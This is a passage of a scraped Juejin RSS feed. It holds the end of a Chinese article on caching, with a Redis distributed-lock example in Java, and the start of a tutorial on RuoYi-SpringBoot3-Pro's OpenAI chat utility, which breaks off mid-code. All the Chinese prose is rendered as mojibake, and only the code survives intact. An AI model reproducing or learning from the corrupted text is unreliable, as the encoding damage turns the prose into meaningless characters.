<p><strong>é—®é¢˜</strong>ï¼šçƒ­ç‚¹Keyè¿‡æœŸç¬é—´ï¼Œå¤§é‡å¹¶å‘è¯·æ±‚åŒæ—¶æŸ¥è¯¢æ•°æ®åº“ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨äº’æ–¥é”ï¼ˆåˆ†å¸ƒå¼é”ï¼‰</span>
<span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProductWithLock</span><span class="hljs-params">(Long id)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:"</span> + id;
    <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> (Product) redisTemplate.opsForValue().get(key);
    
    <span class="hljs-keyword">if</span> (product == <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// å°è¯•è·å–åˆ†å¸ƒå¼é”</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"lock:product:"</span> + id;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">locked</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue()
            .setIfAbsent(lockKey, <span class="hljs-string">"1"</span>, Duration.ofSeconds(<span class="hljs-number">10</span>));
        
        <span class="hljs-keyword">if</span> (locked) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// åŒé‡æ£€æŸ¥</span>
                product = (Product) redisTemplate.opsForValue().get(key);
                <span class="hljs-keyword">if</span> (product == <span class="hljs-literal">null</span>) {
                    product = productDao.findById(id);
                    <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
                        redisTemplate.opsForValue()
                            .set(key, product, Duration.ofMinutes(<span class="hljs-number">30</span>));
                    }
                }
            } <span class="hljs-keyword">finally</span> {
                <span class="hljs-comment">// é‡Šæ”¾é”</span>
                redisTemplate.delete(lockKey);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// æœªè·å–åˆ°é”ï¼Œç­‰å¾…åé‡è¯•</span>
            <span class="hljs-keyword">try</span> { Thread.sleep(<span class="hljs-number">50</span>); } 
            <span class="hljs-keyword">catch</span> (InterruptedException e) { Thread.currentThread().interrupt(); }
            <span class="hljs-keyword">return</span> getProductWithLock(id); <span class="hljs-comment">// é€’å½’é‡è¯•</span>
        }
    }
    
    <span class="hljs-keyword">return</span> product;
}
</code></pre>
<h2 data-id="heading-33">10 æ€»ç»“</h2>
<p>é€šè¿‡è¿™ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬ç³»ç»Ÿåœ°æ¢è®¨äº†å·¥ä½œä¸­æœ€å¸¸ç”¨çš„å…­ç§ç¼“å­˜æŠ€æœ¯ã€‚</p>
<p>æ¯ç§ç¼“å­˜éƒ½æœ‰å…¶ç‹¬ç‰¹çš„ä»·å€¼å’Œåº”ç”¨åœºæ™¯ï¼š</p>
<ol>
<li><strong>æœ¬åœ°ç¼“å­˜</strong>ï¼šé€‚åˆè¿›ç¨‹å†…ã€å˜åŒ–ä¸é¢‘ç¹çš„åªè¯»æ•°æ®</li>
<li><strong>Redis</strong>ï¼šåŠŸèƒ½ä¸°å¯Œçš„åˆ†å¸ƒå¼ç¼“å­˜ï¼Œé€‚åˆå¤§å¤šæ•°å…±äº«ç¼“å­˜åœºæ™¯</li>
<li><strong>Memcached</strong>ï¼šç®€å•é«˜æ•ˆçš„åˆ†å¸ƒå¼ç¼“å­˜ï¼Œé€‚åˆçº¯Key-Valueåœºæ™¯</li>
<li><strong>CDNç¼“å­˜</strong>ï¼šåŠ é€Ÿé™æ€èµ„æºï¼Œæå‡å…¨çƒè®¿é—®é€Ÿåº¦</li>
<li><strong>æµè§ˆå™¨ç¼“å­˜</strong>ï¼šæœ€å‰ç«¯çš„ä¼˜åŒ–ï¼Œå‡å°‘ä¸å¿…è¦çš„ç½‘ç»œè¯·æ±‚</li>
<li><strong>æ•°æ®åº“ç¼“å­˜</strong>ï¼šæœ€åä¸€é“é˜²çº¿ï¼Œä¼˜åŒ–æ•°æ®åº“è®¿é—®æ€§èƒ½</li>
</ol>
<p><strong>ç¼“å­˜ä½¿ç”¨çš„æ ¸å¿ƒåŸåˆ™å¯ä»¥æ€»ç»“ä¸ºä»¥ä¸‹å‡ ç‚¹</strong>ï¼š</p>
<ul>
<li><strong>åˆ†çº§ç¼“å­˜</strong>ï¼šåˆç†åˆ©ç”¨å¤šçº§ç¼“å­˜æ¶æ„</li>
<li><strong>åˆé€‚ç²’åº¦</strong>ï¼šæ ¹æ®ä¸šåŠ¡ç‰¹ç‚¹é€‰æ‹©ç¼“å­˜ç²’åº¦</li>
<li><strong>åŠæ—¶æ›´æ–°</strong>ï¼šè®¾è®¡åˆç†çš„ç¼“å­˜æ›´æ–°ç­–ç•¥</li>
<li><strong>ç›‘æ§å‘Šè­¦</strong>ï¼šå»ºç«‹å®Œå–„çš„ç¼“å­˜ç›‘æ§ä½“ç³»</li>
</ul>
<p>æœ‰äº›å°ä¼™ä¼´åœ¨å·¥ä½œä¸­ä½¿ç”¨ç¼“å­˜æ—¶ï¼Œå®¹æ˜“é™·å…¥ä¸¤ä¸ªæç«¯ï¼šè¦ä¹ˆè¿‡åº¦è®¾è®¡ï¼Œæ‰€æœ‰æ•°æ®éƒ½åŠ ç¼“å­˜ï¼›è¦ä¹ˆå¿½è§†ç¼“å­˜ï¼Œè®©æ•°æ®åº“æ‰¿å—æ‰€æœ‰å‹åŠ›ã€‚</p>
<p><strong>æˆ‘ä»¬éœ€è¦æ‡‚å¾—åœ¨åˆé€‚çš„åœ°æ–¹ä½¿ç”¨åˆé€‚çš„ç¼“å­˜ï¼Œåœ¨æ€§èƒ½å’Œå¤æ‚æ€§ä¹‹é—´æ‰¾åˆ°æœ€ä½³å¹³è¡¡ç‚¹</strong>ã€‚</p>
<p>è®°ä½ï¼Œç¼“å­˜ä¸æ˜¯é“¶å¼¹ï¼Œè€Œæ˜¯å·¥å…·ç®±ä¸­çš„ä¸€ä»¶åˆ©å™¨ã€‚</p>
<h2 data-id="heading-34">æœ€åè¯´ä¸€å¥(æ±‚å…³æ³¨ï¼Œåˆ«ç™½å«–æˆ‘)</h2>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©ï¼Œæˆ–è€…æœ‰æ‰€å¯å‘çš„è¯ï¼Œå¸®å¿™å…³æ³¨ä¸€ä¸‹æˆ‘çš„åŒåå…¬ä¼—å·ï¼šè‹ä¸‰è¯´æŠ€æœ¯ï¼Œæ‚¨çš„æ”¯æŒæ˜¯æˆ‘åšæŒå†™ä½œæœ€å¤§çš„åŠ¨åŠ›ã€‚</p>
<p>æ±‚ä¸€é”®ä¸‰è¿ï¼šç‚¹èµã€è½¬å‘ã€åœ¨çœ‹ã€‚</p>
<p>å…³æ³¨å…¬ä¼—å·ï¼šã€è‹ä¸‰è¯´æŠ€æœ¯ã€‘ï¼Œåœ¨å…¬ä¼—å·ä¸­å›å¤ï¼šè¿›å¤§å‚ï¼Œå¯ä»¥å…è´¹è·å–æˆ‘æœ€è¿‘æ•´ç†çš„10ä¸‡å­—çš„é¢è¯•å®å…¸ï¼Œå¥½å¤šå°ä¼™ä¼´é è¿™ä¸ªå®å…¸æ‹¿åˆ°äº†å¤šå®¶å¤§å‚çš„offerã€‚</p>
<p>æ›´å¤šé¡¹ç›®å®æˆ˜åœ¨æˆ‘çš„æŠ€æœ¯ç½‘ç«™ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.susan.net.cn%2Fproject" title="https://link.juejin.cn?target=http%3A%2F%2Fwww.susan.net.cn%2Fproject" target="_blank">www.susan.net.cn/project</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€RuoYi-SpringBoot3-Proã€‘ï¼šæ¥å…¥ AI å¯¹è¯èƒ½åŠ›]]></title>    <link>https://juejin.cn/post/7583948178858590254</link>    <guid>https://juejin.cn/post/7583948178858590254</guid>    <pubDate>2025-12-16T02:30:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583948178858590254" data-draft-id="7581872532362903561" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€RuoYi-SpringBoot3-Proã€‘ï¼šæ¥å…¥ AI å¯¹è¯èƒ½åŠ›"/> <meta itemprop="keywords" content="Spring Boot,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-16T02:30:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="undsky"/> <meta itemprop="url" content="https://juejin.cn/user/3368559354850206"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€RuoYi-SpringBoot3-Proã€‘ï¼šæ¥å…¥ AI å¯¹è¯èƒ½åŠ›
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3368559354850206/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    undsky
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T02:30:30.000Z" title="Tue Dec 16 2025 02:30:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ã€RuoYi-SpringBoot3-Proã€‘ï¼šæ¥å…¥ AI å¯¹è¯èƒ½åŠ›</h2>
<p>æœ¬æ–‡è¯¦ç»†ä»‹ç» <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fundsky%2FRuoYi-SpringBoot3-Pro" target="_blank" title="https://github.com/undsky/RuoYi-SpringBoot3-Pro" ref="nofollow noopener noreferrer">RuoYi-SpringBoot3-Pro</a> æ¡†æ¶ä¸­å†…ç½®çš„ OpenAI å·¥å…·ç±»ï¼Œå¸®åŠ©å¼€å‘è€…å¿«é€Ÿé›†æˆ AI å¯¹è¯èƒ½åŠ›ã€‚</p>
<blockquote>
<p>GitHubï¼š<code>https://github.com/undsky/RuoYi-SpringBoot3-Pro</code></p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€æ¦‚è¿°</h3>
<p>RuoYi-SpringBoot3-Pro åŸºäºå®˜æ–¹ OpenAI Java SDK å°è£…äº†ä¸€å¥—å¼€ç®±å³ç”¨çš„ AI å·¥å…·ç±»ï¼Œæ”¯æŒåŒæ­¥å¯¹è¯ã€æµå¼å¯¹è¯ã€å¤šè§’è‰²æ¶ˆæ¯ã€ä»£ç†é…ç½®ç­‰ç‰¹æ€§ï¼Œå¹¶å…¼å®¹æ‰€æœ‰éµå¾ª OpenAI åè®®çš„ç¬¬ä¸‰æ–¹ APIã€‚</p>
<p>æ ¸å¿ƒç»„ä»¶ä½äº <code>ruoyi-common</code> æ¨¡å—ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">ruoyi-common/src/main/java/com/ruoyi/common/
â”œâ”€â”€ config/
â”‚   â””â”€â”€ OpenAIConfig.java      <span class="hljs-comment"># é…ç½®ç±»</span>
â””â”€â”€ utils/ai/
    â”œâ”€â”€ OpenAI.java            <span class="hljs-comment"># æ ¸å¿ƒå·¥å…·ç±»</span>
    â”œâ”€â”€ AIMessage.java         <span class="hljs-comment"># æ¶ˆæ¯å®ä½“</span>
    â””â”€â”€ AIRole.java            <span class="hljs-comment"># è§’è‰²æšä¸¾</span>
</code></pre>
<h3 data-id="heading-2">äºŒã€å¿«é€Ÿå¼€å§‹</h3>
<h4 data-id="heading-3">2.1 Maven ä¾èµ–</h4>
<p>æ¡†æ¶å·²å†…ç½® OpenAI SDK ä¾èµ–ï¼Œæ— éœ€é¢å¤–å¼•å…¥ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.openai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>openai-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.20.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-4">2.2 é…ç½®æ–‡ä»¶</h4>
<p>åœ¨ <code>application.yml</code> ä¸­æ·»åŠ  OpenAI é…ç½®ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># OpenAIé…ç½®</span>
<span class="hljs-attr">openai:</span>
  <span class="hljs-comment"># APIå¯†é’¥</span>
  <span class="hljs-attr">api-key:</span> <span class="hljs-string">sk-xxx</span>
  <span class="hljs-comment"># åŸºç¡€URLï¼ˆæ”¯æŒè‡ªå®šä¹‰APIåœ°å€ï¼‰</span>
  <span class="hljs-attr">base-url:</span> <span class="hljs-string">https://api.openai.com/v1</span>
  <span class="hljs-comment"># é»˜è®¤æ¨¡å‹</span>
  <span class="hljs-attr">model:</span> <span class="hljs-string">gpt-4o</span>
  <span class="hljs-comment"># ä»£ç†é…ç½®ï¼ˆå¯é€‰ï¼‰</span>
  <span class="hljs-attr">proxy:</span>
    <span class="hljs-comment"># æ˜¯å¦å¯ç”¨ä»£ç†</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">false</span>
    <span class="hljs-comment"># ä»£ç†ç±»å‹ (HTTP/SOCKS)</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">HTTP</span>
    <span class="hljs-comment"># ä»£ç†ä¸»æœº</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-comment"># ä»£ç†ç«¯å£</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">7890</span>
</code></pre>
<p><strong>é…ç½®è¯´æ˜ï¼š</strong></p>













































<table><thead><tr><th>é…ç½®é¡¹</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>api-key</code></td><td>OpenAI API å¯†é’¥</td><td><code>sk-xxx</code></td></tr><tr><td><code>base-url</code></td><td>API åŸºç¡€åœ°å€ï¼Œæ”¯æŒç¬¬ä¸‰æ–¹å…¼å®¹ API</td><td><code>https://api.openai.com/v1</code></td></tr><tr><td><code>model</code></td><td>é»˜è®¤ä½¿ç”¨çš„æ¨¡å‹</td><td><code>gpt-4o</code>ã€<code>gpt-3.5-turbo</code></td></tr><tr><td><code>proxy.enabled</code></td><td>æ˜¯å¦å¯ç”¨ä»£ç†</td><td><code>true</code>/<code>false</code></td></tr><tr><td><code>proxy.type</code></td><td>ä»£ç†ç±»å‹</td><td><code>HTTP</code>/<code>SOCKS</code></td></tr><tr><td><code>proxy.host</code></td><td>ä»£ç†æœåŠ¡å™¨åœ°å€</td><td><code>127.0.0.1</code></td></tr><tr><td><code>proxy.port</code></td><td>ä»£ç†æœåŠ¡å™¨ç«¯å£</td><td><code>7890</code></td></tr></tbody></table>
<h3 data-id="heading-5">ä¸‰ã€æ ¸å¿ƒ API</h3>
<h4 data-id="heading-6">3.1 è§’è‰²æšä¸¾ - AIRole</h4>
<p>æ”¯æŒ OpenAI Chat API çš„ä¸‰ç§æ ‡å‡†è§’è‰²ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">AIRole</span> {
    USER(<span class="hljs-string">"user"</span>),           <span class="hljs-comment">// ç”¨æˆ·æ¶ˆæ¯</span>
    SYSTEM(<span class="hljs-string">"system"</span>),       <span class="hljs-comment">// ç³»ç»Ÿæç¤ºè¯</span>
    ASSISTANT(<span class="hljs-string">"assistant"</span>); <span class="hljs-comment">// AI åŠ©æ‰‹å›å¤</span>
}
</code></pre>
<h4 data-id="heading-7">3.2 æ¶ˆæ¯å®ä½“ - AIMessage</h4>
<p>å°è£…å¯¹è¯æ¶ˆæ¯ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AIMessage</span> {
    <span class="hljs-keyword">private</span> AIRole role;    <span class="hljs-comment">// æ¶ˆæ¯è§’è‰²</span>
    <span class="hljs-keyword">private</span> String message; <span class="hljs-comment">// æ¶ˆæ¯å†…å®¹</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AIMessage</span><span class="hljs-params">(AIRole role, String message)</span> {
        <span class="hljs-built_in">this</span>.role = role;
        <span class="hljs-built_in">this</span>.message = message;
    }
}
</code></pre>
<h4 data-id="heading-8">3.3 å·¥å…·ç±» - OpenAI</h4>
<p>æä¾›ä¸‰ä¸ªæ ¸å¿ƒé™æ€æ–¹æ³•ï¼š</p>

























<table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>chatClient()</code></td><td>åˆ›å»º OpenAI å®¢æˆ·ç«¯</td></tr><tr><td><code>chatParams()</code></td><td>æ„å»ºä¼šè¯å‚æ•°</td></tr><tr><td><code>chat()</code></td><td>åŒæ­¥å¯¹è¯</td></tr><tr><td><code>chatStream()</code></td><td>æµå¼å¯¹è¯ï¼ˆSSEï¼‰</td></tr></tbody></table>
<h3 data-id="heading-9">å››ã€ä½¿ç”¨ç¤ºä¾‹</h3>
<h4 data-id="heading-10">4.1 åŒæ­¥å¯¹è¯</h4>
<p>é€‚ç”¨äºç®€å•çš„é—®ç­”åœºæ™¯ï¼Œç­‰å¾… AI å®Œæ•´å“åº”åè¿”å›ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.openai.client.OpenAIClient;
<span class="hljs-keyword">import</span> com.openai.models.chat.completions.ChatCompletionCreateParams;
<span class="hljs-keyword">import</span> com.ruoyi.common.config.OpenAIConfig;
<span class="hljs-keyword">import</span> com.ruoyi.common.utils.ai.*;

<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatExample</span> {
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">simpleChat</span><span class="hljs-params">(String userMessage)</span> {
        <span class="hljs-comment">// 1. åˆ›å»ºå®¢æˆ·ç«¯</span>
        <span class="hljs-type">OpenAIClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> OpenAI.chatClient(
            OpenAIConfig.getApiKey(),
            OpenAIConfig.getBaseUrl(),
            OpenAIConfig.getProxy() != <span class="hljs-literal">null</span> ? OpenAIConfig.getProxy().toJavaProxy() : <span class="hljs-literal">null</span>
        );
        
        <span class="hljs-comment">// 2. æ„å»ºæ¶ˆæ¯åˆ—è¡¨</span>
        List&lt;AIMessage&gt; messages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AIMessage</span>(AIRole.SYSTEM, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªæœ‰å¸®åŠ©çš„åŠ©æ‰‹ã€‚"</span>));
        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AIMessage</span>(AIRole.USER, userMessage));
        
        <span class="hljs-comment">// 3. æ„å»ºè¯·æ±‚å‚æ•°</span>
        <span class="hljs-type">ChatCompletionCreateParams</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> OpenAI.chatParams(
            OpenAIConfig.getModel(), 
            messages
        );
        
        <span class="hljs-comment">// 4. å‘èµ·åŒæ­¥è¯·æ±‚</span>
        <span class="hljs-keyword">return</span> OpenAI.chat(client, params);
    }
}
</code></pre>
<h4 data-id="heading-11">4.2 æµå¼å¯¹è¯ï¼ˆSSEï¼‰</h4>
<p>é€‚ç”¨äºéœ€è¦å®æ—¶å±•ç¤ºç”Ÿæˆå†…å®¹çš„åœºæ™¯ï¼Œå¦‚èŠå¤©ç•Œé¢ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.StreamingResponseBody;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/ai")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AIController</span> {
    
    <span class="hljs-meta">@PostMapping("/chat/stream")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;StreamingResponseBody&gt; <span class="hljs-title function_">streamChat</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String userMessage)</span> {
        <span class="hljs-comment">// 1. åˆ›å»ºå®¢æˆ·ç«¯</span>
        <span class="hljs-type">OpenAIClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> OpenAI.chatClient(
            OpenAIConfig.getApiKey(),
            OpenAIConfig.getBaseUrl(),
            OpenAIConfig.getProxy() != <span class="hljs-literal">null</span> ? OpenAIConfig.getProxy().toJavaProxy() : <span class="hljs-literal">null</span>
        );
        
        <span class="hljs-comment">// 2. æ„å»ºæ¶ˆæ¯</span>
        List&lt;AIMessage&gt; messages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AIMessage</span>(AIRole.SYSTEM, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªæœ‰å¸®åŠ©çš„åŠ©æ‰‹ã€‚"</span>));
        messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AIMessage</span>(AIRole.USER, userMessage));
        
        <span class="hljs-comment">// 3. æ„å»ºå‚æ•°</span>
        <span class="hljs-type">ChatCompletionCreateParams</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> OpenAI.chatParams(
            OpenAIConfig.getModel(), 
            messages
        );
        
        <span class="hljs-comment">// 4. æµå¼å“åº”</span>
        <span class="hljs-keyword">return</span> OpenAI.chatStream(client, params, <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>.StreamContentListener() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onContent</span><span class="hljs-params">(String content)</span> {
                <span class="hljs-comment">// æ¯æ”¶åˆ°ä¸€æ®µå¢é‡å†…å®¹æ—¶è°ƒç”¨</span>
                System.out.print(content);
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">(String fullContent)</span> {
                <span class="hljs-comment">// å…¨éƒ¨å†…å®¹æµå¼ç»“æŸåè°ƒç”¨</span>
                System.out.println(<span class="hljs-string">"\nå®Œæ•´å“åº”ï¼š"</span> + fullContent);
            }
        });
    }
}
</code></pre>
<h4 data-id="heading-12">4.3 å¤šè½®å¯¹è¯</h4>
<p>ç»´æŠ¤å¯¹è¯å†å²å®ç°ä¸Šä¸‹æ–‡è¿ç»­ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiTurnChat</span> {
